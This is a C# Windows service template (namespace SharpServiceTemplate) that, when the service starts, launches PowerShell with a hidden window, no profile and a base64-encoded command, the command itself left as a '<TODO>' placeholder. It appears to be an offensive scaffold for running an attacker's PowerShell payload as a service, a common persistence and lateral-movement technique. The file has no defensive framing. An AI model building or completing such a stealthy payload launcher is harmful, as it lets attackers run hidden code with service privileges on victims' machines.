using System.Diagnostics;
using System.ServiceProcess;

namespace SharpServiceTemplate
{
	public partial class ServiceTemplate : ServiceBase
	{
		public ServiceTemplate()
		{
			InitializeComponent();
		}

		protected override void OnStart(string[] args)
		{
			var processStartInfo = new ProcessStartInfo
			{
				FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
				Arguments = @"-Sta -Nop -Window Hidden -EncodedCommand <TODO>"
			};

			var process = new Process
			{
				StartInfo = processStartInfo
			};

			process.Start();
			process.WaitForExit();
			process.Dispose();
		}

		protected override void OnStop()
		{
		}
	}
}
